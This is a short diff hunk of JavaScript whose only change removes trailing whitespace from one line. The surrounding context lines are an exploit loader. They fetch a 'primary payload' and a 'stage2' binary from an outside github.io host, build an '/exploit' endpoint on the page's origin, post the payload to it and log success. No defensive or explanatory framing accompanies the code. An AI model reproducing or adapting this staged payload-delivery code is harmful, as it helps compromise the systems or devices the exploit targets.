@@ -12,7 +12,7 @@
                 const primaryPayload = await fetchPayload('https://alihussien96.github.io/payload.bin');
                 const stage2Payload = await fetchPayload('https://alihussien96.github.io/stage2_11.00.bin');
 
-                const exploitEndpoint = `${window.location.origin}/exploit`; 
+                const exploitEndpoint = `${window.location.origin}/exploit`;
 
                 await sendPayload(exploitEndpoint, primaryPayload);
                 console.log('Primary payload sent successfully');
